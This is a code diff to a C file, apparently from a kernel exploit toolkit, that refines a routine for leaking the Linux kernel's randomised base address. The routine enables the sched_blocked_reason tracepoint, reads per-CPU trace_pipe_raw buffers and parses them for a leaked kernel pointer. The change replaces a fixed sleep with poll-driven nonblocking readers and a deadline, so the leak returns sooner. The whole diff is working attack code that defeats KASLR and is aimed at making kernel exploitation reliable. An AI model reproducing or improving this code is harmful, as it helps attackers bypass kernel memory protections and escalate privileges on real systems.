@@ -27,19 +27,21 @@
  *      real block I/O while sched_blocked_reason is about to be armed --
  *      plausibly makes worker_thread's tracepoint fire more reliably
  *      instead of racing an idle system.
- *   2. The trace-collection window is configurable via
- *      TRACEFS_SAMPLE_SECONDS (default 1, clamped [1,30]) instead of our
- *      fixed sleep(1).
+ *   2. The trace-collection deadline is configurable via
+ *      TRACEFS_SAMPLE_SECONDS (default 1, clamped [1,30]). Nonblocking
+ *      trace_pipe_raw readers now return as soon as a valid caller appears.
  */
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <poll.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <time.h>
 #include <unistd.h>
 
 #include "kaslr.h"
@@ -198,6 +200,35 @@ static int sample_seconds(void) {
   return (int)value;
 }
 
+struct trace_reader {
+  int fd;
+  long pages;
+  long bytes;
+};
+
+static uint64_t monotonic_ms(void) {
+  struct timespec now;
+  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return 0;
+  return (uint64_t)now.tv_sec * 1000ULL +
+         (uint64_t)now.tv_nsec / 1000000ULL;
+}
+
+static int drain_trace_reader(struct trace_reader *reader,
+                              uint64_t *candidate_out) {
+  unsigned char page[4096];
+  for (;;) {
+    ssize_t got = read(reader->fd, page, sizeof(page));
+    if (got > 0) {
+      reader->pages++;
+      reader->bytes += got;
+      if (parse_trace_page(page, (size_t)got, candidate_out)) return 1;
+      continue;
+    }
+    if (got < 0 && errno == EINTR) continue;
+    return 0;
+  }
+}
+
 int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   static const char tracing_on[] = TRACEFS_ROOT "/tracing_on";
   static const char trace[] = TRACEFS_ROOT "/trace";
@@ -221,38 +252,83 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
 
   prime_block_io();
 
-  int wait_sec = sample_seconds();
-  fprintf(stderr, "[kaslr] sampling sched_blocked_reason for %ds\n",
-          wait_sec);
-  sleep((unsigned int)wait_sec);
-  tracefs_write(tracing_on, "0");
-
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  uint64_t candidate = 0;
-  int found = 0;
-  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+  if (cpu_count <= 0) {
+    tracefs_write(tracing_on, "0");
+    tracefs_write(event_enable, "0");
+    return 0;
+  }
+  struct trace_reader *readers = calloc((size_t)cpu_count, sizeof(*readers));
+  struct pollfd *pollfds = calloc((size_t)cpu_count, sizeof(*pollfds));
+  if (!readers || !pollfds) {
+    free(readers);
+    free(pollfds);
+    tracefs_write(tracing_on, "0");
+    tracefs_write(event_enable, "0");
+    return 0;
+  }
+  for (int cpu = 0; cpu < cpu_count; cpu++) {
+    readers[cpu].fd = -1;
+    pollfds[cpu].fd = -1;
     char path[128];
     snprintf(path, sizeof(path), TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw",
              cpu);
     int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
-    if (fd < 0) {
-      continue;
+    if (fd >= 0) {
+      readers[cpu].fd = fd;
+      pollfds[cpu].fd = fd;
+      pollfds[cpu].events = POLLIN;
     }
-    unsigned char page[4096];
-    ssize_t got;
-    long pages = 0, total = 0;
-    while ((got = read(fd, page, sizeof(page))) > 0) {
-      pages++;
-      total += got;
-      if (parse_trace_page(page, (size_t)got, &candidate)) {
-        found = 1;
-        break;
+  }
+
+  int wait_sec = sample_seconds();
+  int wait_ms = wait_sec * 1000;
+  fprintf(stderr, "[kaslr] sampling sched_blocked_reason up to %dms\n",
+          wait_ms);
+  uint64_t candidate = 0;
+  int found = 0;
+  uint64_t started_ms = monotonic_ms();
+  uint64_t deadline_ms = started_ms + (uint64_t)wait_ms;
+  if (!started_ms) {
+    sleep((unsigned int)wait_sec);
+  } else {
+    while (!found) {
+      for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+        if (readers[cpu].fd >= 0) {
+          found = drain_trace_reader(&readers[cpu], &candidate);
+        }
+      }
+      uint64_t now_ms = monotonic_ms();
+      if (found || !now_ms || now_ms >= deadline_ms) break;
+      int remaining_ms = (int)(deadline_ms - now_ms);
+      int poll_ms = remaining_ms < 50 ? remaining_ms : 50;
+      int ready;
+      do {
+        ready = poll(pollfds, (nfds_t)cpu_count, poll_ms);
+      } while (ready < 0 && errno == EINTR);
+      if (ready < 0) break;
+    }
+  }
+  tracefs_write(tracing_on, "0");
+  if (!found) {
+    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+      if (readers[cpu].fd >= 0) {
+        found = drain_trace_reader(&readers[cpu], &candidate);
       }
     }
-    fprintf(stderr, "[kaslr] cpu%d pages=%ld bytes=%ld found=%d\n", cpu,
-            pages, total, found);
-    close(fd);
   }
+  for (int cpu = 0; cpu < cpu_count; cpu++) {
+    if (readers[cpu].fd < 0) continue;
+    fprintf(stderr, "[kaslr] cpu%d pages=%ld bytes=%ld\n", cpu,
+            readers[cpu].pages, readers[cpu].bytes);
+    close(readers[cpu].fd);
+  }
+  uint64_t finished_ms = monotonic_ms();
+  uint64_t elapsed_ms = started_ms && finished_ms >= started_ms
+                            ? finished_ms - started_ms
+                            : (uint64_t)wait_ms;
+  free(pollfds);
+  free(readers);
   tracefs_write(event_enable, "0");
 
   if (!found) {
@@ -263,8 +339,8 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   *kernel_base_out = KIMAGE_TEXT_BASE + candidate;
   fprintf(stderr,
           "[kaslr] source=tracefs base=%016llx slide=%016llx "
-          "p0_offset=%08llx\n",
+          "p0_offset=%08llx sample_ms=%llu\n",
           (unsigned long long)*kernel_base_out, (unsigned long long)candidate,
-          (unsigned long long)candidate);
+          (unsigned long long)candidate, (unsigned long long)elapsed_ms);
   return 1;
 }
